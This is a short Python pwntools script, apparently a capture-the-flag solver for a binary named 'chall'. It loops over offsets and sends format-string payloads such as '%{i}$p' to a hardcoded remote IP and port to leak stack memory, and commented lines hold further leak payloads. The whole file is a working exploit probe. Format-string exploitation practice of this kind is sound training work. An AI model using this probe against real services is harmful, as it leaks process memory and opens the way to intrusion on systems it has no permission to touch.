from pwn import *
# import sys
# filename = sys.argv[1]
elf = context.binary = ELF(f"./chall")

for i in range(100):
    p = process()
    p = remote("194.31.53.241",1342)
    print(f"======> {i}")
    # p.sendline("OMO%77$pOMO%46$p")
    p.sendline(f"%{i}$p")
    # p.sendline(f"%{i}$s")
    print(p.recv(9999))
    p.close()